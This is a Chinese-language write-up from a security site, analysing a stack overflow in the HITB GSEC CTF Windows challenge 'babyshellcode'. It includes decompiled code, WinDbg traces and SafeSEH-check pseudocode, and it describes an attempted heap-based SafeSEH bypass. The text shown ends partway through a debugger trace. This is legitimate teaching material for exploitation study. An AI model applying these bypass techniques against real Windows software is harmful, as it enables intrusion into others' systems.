<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>HITB GSEC CTF Win Pwn 解题全记录之 babyshellcode</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">HITB GSEC CTF Win Pwn 解题全记录之 babyshellcode</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-08-29" class="timeago">3 周 之前</time>
          <time datetime="2017-08-29" class="fulldate">八月 29, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/experience/">经验心得</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p>作者：<a href="https://whereisk0shl.top/hitb_gsec_ctf_babyshellcode_writeup.html">k0shl</a></p>
<h4>前言</h4>
<p>这次在 HITB GSEC CTF 打酱油，也有了一次学习的机会，这次CTF出现了两道 Windows pwn，我个人感觉质量非常高，因为题目出了本身无脑洞的漏洞之外，更多的让选手们专注于对 Windows 系统的防护机制（seh）原理的研究，再配合漏洞来完成对机制的突破和利用，在我做完之后重新整理整个解题过程，略微有一些窒息的感觉，感觉整个利用链环环相扣，十分精彩，不得不膜一下Atum大佬，题目出的真的好！对于菜鸟来说，是一次非常好的锻炼机会。</p>
<p>因此我认真总结了我们从拿到题目，多种尝试，不断改进 exp，到最后获得 shell 的整个过程，而不仅仅是针对题目，希望能对同样奋斗在 win pwn 的小伙伴有一些帮助。</p>
<h4>Babyshellcode Writeup with SEH and SafeSEH From Windows xp to Windows 10</h4>
<p>拿到题目的时候，我们发现程序存在一个很明显的栈溢出，而且题目给的一些条件非常好，在栈结构中存在 SEH 链，在常规的利用 SEH 链进行栈溢出从而控制 eip 的过程中，我们会使用栈溢出覆盖 seh handler，这是一个 seh chain 中的一个指针，它指向了异常处理函数。</p>
<p>但是程序中开启了 safeseh，也就是说，单纯的通过覆盖 seh handler 跳转是不够的，我们首先需要 bypass safeseh。</p>
<p>OK，我们来看题目。</p>
<p>在题目主函数中，首先在 <code>scmgr.dll</code> 中会初始化存放 shellcode 的堆，调用的是 VirtualAlloc 函数，并且会打印堆地址。</p>
<div class="codehilite"><pre><span></span>  v0 = VirtualAlloc(0, 20 * SystemInfo.dwPageSize, 0x1000u, 0x40u);//注意这里的flprotect是0x40

  dword_1000338C = (int)v0;

  if ( v0 )

  {

    sub_10001020(&quot;Global memory alloc at %p\n&quot;, (char)v0);//打印堆地址

    result = dword_1000338C;

    dword_10003388 = dword_1000338C;

  }
</pre></div>


<p>这里 VirtualAlloc 中有一个参数是 flprotect，值是 0x40，表示拥有 RWE 权限。</p>
<div class="codehilite"><pre><span></span>#define PAGE_EXECUTE_READWRITE 0x40
</pre></div>


<p>这个堆地址会用于存放 shellcode，在 CreateShellcode 函数中会将 shellcode 拷贝到 Memory 空间里。</p>
<div class="codehilite"><pre><span></span>  v4 = 0;//v4在最开始拷贝的时候值是0

  ⋯⋯

  v11 = (int)*(&amp;Memory + v4);//将Memory地址指针交给v11

  v13 = getchar();

  v14 = 0;

  if ( v12 )

  {

    do

    {

      *(_BYTE *)(v14++ + v15) = v13;//为Memory赋值

      v13 = getchar();

    }

    while ( v14 != v12 );

    v4 = v16;

  }
</pre></div>


<p>执行结束之后可以看到 shellcode 已经被拷贝到目标空间中。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/08/f5c87ee1-fc76-46d9-a62e-8c649e60626a.png-w331s" /></p>
<p>随后执行 runshellcode 指令的时候，会调用“虚函数”，这里用引号表示，其实并不是真正的虚函数，只是虚函数的一种常见调用方法（做了 CFG check，这里有个小插曲），实际上调用的是 VirtualAlloc 出来的堆的地址。</p>
<div class="codehilite"><pre><span></span>    v4 = *(void (**)(void))(v1 + 4);

    __guard_check_icall_fptr(*(_DWORD *)(v1 + 4));

    v4();
</pre></div>


<p>可以看到这里有个 CFG check，之前我们一直以为环境是 Win7，在 Win7 里 CFG 没有实装，这个在我之前的一篇<a href="https://whereisk0shl.top/cve_2017_0037_ie11&amp;edge_type_confusion.html" title="IE11浏览器漏洞的文章">IE11浏览器漏洞的文章</a>中也提到过，因此这个 Check是没用的，但是后来得知系统是 Win10（这个后面会提到），这里会检查指针是否合法，这里无论如何都会合法，因为 v1+4 位置的值控制不了，这里就是指向堆地址。</p>
<p>这里跳转到堆地址后会由于 shellcode 头部4字节被修改，导致进入堆地址后是无效的汇编指令。</p>
<div class="codehilite"><pre><span></span>  byte_405448 = 1;

  puts(&quot;Hey, Welcome to shellcode test system!&quot;);



    if ( byte_405448 )

    {

      v3 = *(_DWORD **)(v1 + 4);

      memcpy(&amp;Dst, *(const void **)(v1 + 4), *(_DWORD *)(v1 + 8));//这里没有对长度进行控制，造成栈溢出

      *v3 = -1;

    }
</pre></div>


<p><code>byte_405448</code> 是一个全局变量 <code>is_guard</code>，它在 runshellcode 里决定了存放 shellcode 堆指针指向的 shellcode 前4字节是否改成0xffffffff，这里 <code>byte_405448</code>的值是 1，因此头部会被修改，而我们也必须进入这里，只有这里才能造成栈溢出。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">g</span>

<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">hit</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">002</span><span class="n">bf7a4</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">68</span><span class="n">bc1100</span> <span class="n">esi</span><span class="o">=</span><span class="mi">000</span><span class="n">e0000</span> <span class="n">edi</span><span class="o">=</span><span class="mi">0048</span><span class="n">e430</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">00</span><span class="n">a113f3</span> <span class="n">esp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf794</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf824</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">ac</span> <span class="n">po</span> <span class="n">nc</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000212</span>

<span class="n">babyshellcode</span><span class="o">+</span><span class="mh">0x13f3</span><span class="o">:</span>

<span class="mi">00</span><span class="n">a113f3</span> <span class="n">c706ffffffff</span>    <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">esi</span><span class="o">],</span><span class="mi">0</span><span class="n">FFFFFFFFh</span> <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">000</span><span class="n">e0000</span><span class="o">=</span><span class="mi">61616161</span><span class="c1">//shellcode头部被修改前正常</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">e0000</span> <span class="n">l1</span>

<span class="mi">000</span><span class="n">e0000</span>  <span class="mi">61616161</span> 

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">002</span><span class="n">bf7a4</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">68</span><span class="n">bc1100</span> <span class="n">esi</span><span class="o">=</span><span class="mi">000</span><span class="n">e0000</span> <span class="n">edi</span><span class="o">=</span><span class="mi">0048</span><span class="n">e430</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">00</span><span class="n">a113f9</span> <span class="n">esp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf794</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf824</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">ac</span> <span class="n">po</span> <span class="n">nc</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000212</span>

<span class="n">babyshellcode</span><span class="o">+</span><span class="mh">0x13f9</span><span class="o">:</span>

<span class="mi">00</span><span class="n">a113f9</span> <span class="mi">8</span><span class="n">b7704</span>          <span class="n">mov</span>     <span class="n">esi</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">edi</span><span class="o">+</span><span class="mi">4</span><span class="o">]</span> <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">0048</span><span class="n">e434</span><span class="o">=</span><span class="mi">000</span><span class="n">e0000</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">e0000</span> <span class="n">l1</span><span class="c1">//头部被修改成0xffffffff</span>

<span class="mi">000</span><span class="n">e0000</span>  <span class="n">ffffffff</span>
</pre></div>


<p>随后我们跳转到头部执行，由于指令异常进入异常处理模块。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">002</span><span class="n">bf7a4</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">000</span><span class="n">e0000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">68</span><span class="n">bc1100</span> <span class="n">esi</span><span class="o">=</span><span class="mi">000</span><span class="n">e0000</span> <span class="n">edi</span><span class="o">=</span><span class="mi">0048</span><span class="n">e430</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">00</span><span class="n">a11404</span> <span class="n">esp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf794</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf824</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">ac</span> <span class="n">po</span> <span class="n">nc</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000212</span>

<span class="n">babyshellcode</span><span class="o">+</span><span class="mh">0x1404</span><span class="o">:</span>

<span class="mi">00</span><span class="n">a11404</span> <span class="n">ffd6</span>            <span class="n">call</span>    <span class="n">esi</span> <span class="o">{</span><span class="mi">000</span><span class="n">e0000</span><span class="o">}//</span><span class="err">跳转到堆</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">t</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">002</span><span class="n">bf7a4</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">000</span><span class="n">e0000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">68</span><span class="n">bc1100</span> <span class="n">esi</span><span class="o">=</span><span class="mi">000</span><span class="n">e0000</span> <span class="n">edi</span><span class="o">=</span><span class="mi">0048</span><span class="n">e430</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">000</span><span class="n">e0000</span> <span class="n">esp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf790</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf824</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">ac</span> <span class="n">po</span> <span class="n">nc</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000212</span>

<span class="mi">000</span><span class="n">e0000</span> <span class="n">ff</span>              <span class="o">???//</span><span class="err">异常指令</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span><span class="c1">//进入异常处理模块</span>

<span class="o">(</span><span class="mi">20</span><span class="n">f90</span><span class="o">.</span><span class="mi">20</span><span class="n">f9c</span><span class="o">):</span> <span class="n">Illegal</span> <span class="n">instruction</span> <span class="o">-</span> <span class="n">code</span> <span class="n">c000001d</span> <span class="o">(</span><span class="n">first</span> <span class="n">chance</span><span class="o">)</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">002</span><span class="n">bf7a4</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">000</span><span class="n">e0000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">68</span><span class="n">bc1100</span> <span class="n">esi</span><span class="o">=</span><span class="mi">000</span><span class="n">e0000</span> <span class="n">edi</span><span class="o">=</span><span class="mi">0048</span><span class="n">e430</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">770</span><span class="n">b6bc9</span> <span class="n">esp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf340</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf824</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">ac</span> <span class="n">po</span> <span class="n">nc</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000212</span>

<span class="n">ntdll</span><span class="o">!</span><span class="n">KiUserExceptionDispatcher</span><span class="o">+</span><span class="mh">0x1</span><span class="o">:</span>

<span class="mi">770</span><span class="n">b6bc9</span> <span class="mi">8</span><span class="n">b4c2404</span>        <span class="n">mov</span>     <span class="n">ecx</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="o">]</span> <span class="n">ss</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">002</span><span class="n">bf344</span><span class="o">=</span><span class="mi">002</span><span class="n">bf35c</span>
</pre></div>


<p>利用 SEH 是栈溢出里常见的一种利用方法，在没有 SafeSEH 和 SEHOP 的情况下，可以利用 seh 里一个特殊的结构 seh handler，通过覆盖它来完成 eip/rip 的控制，它指向的是异常处理函数，而加入了 safeseh之后，会对 sehhandler 进行 check，检查它是否可信，不可信的话返回0，则不会跳转到 seh handler。而这个 safeseh 的 check 在 ntdll 的 RtlIsValidHandler 函数中，几年前 Alex 就发了关于这个函数的解读，现在伪代码遍地都是了。</p>
<div class="codehilite"><pre><span></span>BOOL RtlIsValidHandler(handler)



{

if (handler is in an image)//step 1 

{

         // 在加载模块的进程空间

if (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag set)

    return FALSE; // 该标志设置，忽略异常处理，直接返回FALSE

if (image has a SafeSEH table) // 是否含有SEH表

    if (handler found in the table)

        return TRUE; // 异常处理handle在表中，返回TRUE

    else

        return FALSE; // 异常处理handle不在表中，返回FALSE

if (image is a .NET assembly with the ILonly flag set)

    return FALSE; // .NET 返回FALSE

// fall through

}

if (handler is on a non-executable page)//step 2

{

         // handle在不可执行页上面

    if (ExecuteDispatchEnable bit set in the process flags)

        return TRUE; // DEP关闭，返回TRUE；否则抛出异常

    else

        raise ACCESS_VIOLATION; // enforce DEP even if we have no hardware NX

}

if (handler is not in an image)//step 3

{

         // 在加载模块内存之外，并且是可执行页

    if (ImageDispatchEnable bit set in the process flags)

        return TRUE; // 允许在加载模块内存空间外执行，返回验证成功

    else

        return FALSE; // don&#39;t allow handlers outside of images

}

// everything else is allowed

return TRUE;

}
</pre></div>


<p>首先我们想到的是利用堆指针来 bypass safeseh，正好这个堆地址指向的 shellcode，但是由于头部四字节呗修改成了 0xffffffff，因此我们只需要覆盖 seh handler 为 heap address＋4，然后把 shellcode 跳过开头4字节编码，头4字节放任意字符串（反正会被编码成0xffffffff），然后后面放 shellcode 的内容，应该就可以达到利用了（事实证明我too young too naive了，这个方法在 win xp 下可以用。）</p>
<p>于是我们想到的栈布局如下：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/08/ed9dbeff-31c5-43b2-b526-2bd3d5f461ec.png-w331s" /></p>
<p>但我们这样执行后，在 windows xp 下可以完成，但是 win7 下依然 crash 了，这就需要我们跟进 <code>ntdll!RtlIsValidHandler</code> 函数，回头看下伪代码部分。</p>
<p>这里有三步 check，首先 step1，if 是不通过的因为堆地址属于加载进程外的地址，同理 step2 也是不通过的，因为堆地址申请的时候是可执行的，之所以用堆绕过 SafeSEH 是因为堆地址属于当前进程加载内存映像空间之外的地址。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="o">!</span><span class="n">address</span> <span class="n">e0000</span>

<span class="n">Usage</span><span class="o">:</span>                  <span class="o">&lt;</span><span class="n">unclassified</span><span class="o">&gt;</span>

<span class="n">Allocation</span> <span class="n">Base</span><span class="o">:</span>        <span class="mi">000</span><span class="n">e0000</span>

<span class="n">Base</span> <span class="n">Address</span><span class="o">:</span>           <span class="mi">000</span><span class="n">e0000</span>

<span class="n">End</span> <span class="n">Address</span><span class="o">:</span>            <span class="mi">000</span><span class="n">f4000</span>

<span class="n">Region</span> <span class="n">Size</span><span class="o">:</span>            <span class="mi">00014000</span>

<span class="n">Type</span><span class="o">:</span>                   <span class="mi">00020000</span>    <span class="n">MEM_PRIVATE</span>

<span class="n">State</span><span class="o">:</span>                  <span class="mi">00001000</span>    <span class="n">MEM_COMMIT</span>

<span class="n">Protect</span><span class="o">:</span>                <span class="mi">00000040</span>    <span class="n">PAGE_EXECUTE_READWRITE</span>
</pre></div>


<p>那么 safeseh 进入 step 3，又是加载模块内存之外的，又是可执行的，在 winxp，通过堆绕过是可行的，但是在 Win7 及以上版本就不行了，为什么呢，因为这里多了一个 Check，内容是 <code>MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE</code>，它决定了是否允许在加载模块内存空间外执行。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/08/ccbcfcfe-7e48-4279-aada-578a32dda860.jpg-w331s" /></p>
<p>这里只有当第六个比特为1时，才是可执行的</p>
<p>这里值是 0x4d，也就是 1001101，第六个比特是 0，也就是 <code>MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE</code> 是不允许的，因此会 return FALSE。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">000</span><span class="n">e0000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">002</span><span class="n">bf254</span> <span class="n">edx</span><span class="o">=</span><span class="mi">770</span><span class="n">b6c74</span> <span class="n">esi</span><span class="o">=</span><span class="mi">002</span><span class="n">bf348</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">77100224</span> <span class="n">esp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf274</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf2b0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">ng</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">cy</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000287</span>

<span class="n">ntdll</span><span class="o">!</span><span class="n">RtlIsValidHandler</span><span class="o">+</span><span class="mh">0xff</span><span class="o">:</span>

<span class="mi">77100224</span> <span class="mi">8</span><span class="n">a450c</span>          <span class="n">mov</span>     <span class="n">al</span><span class="o">,</span><span class="n">byte</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ebp</span><span class="o">+</span><span class="mi">0</span><span class="n">Ch</span><span class="o">]</span>      <span class="n">ss</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">002</span><span class="n">bf2bc</span><span class="o">=</span><span class="mi">4</span><span class="n">d</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">002</span><span class="n">bf814</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">736</span><span class="n">f4037</span> <span class="n">edx</span><span class="o">=</span><span class="mi">770</span><span class="n">b6c74</span> <span class="n">esi</span><span class="o">=</span><span class="mi">002</span><span class="n">bf348</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">7708</span><span class="n">f88d</span> <span class="n">esp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf2b4</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf330</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>

<span class="n">ntdll</span><span class="o">!</span><span class="n">RtlIsValidHandler</span><span class="o">+</span><span class="mh">0xfc</span><span class="o">:</span>

<span class="mi">7708</span><span class="n">f88d</span> <span class="n">c20800</span>          <span class="n">ret</span>     <span class="mi">8</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">002</span><span class="n">bf814</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">736</span><span class="n">f4037</span> <span class="n">edx</span><span class="o">=</span><span class="mi">770</span><span class="n">b6c74</span> <span class="n">esi</span><span class="o">=</span><span class="mi">002</span><span class="n">bf348</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">7708</span><span class="n">f9fe</span> <span class="n">esp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf2c0</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">002</span><span class="n">bf330</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>

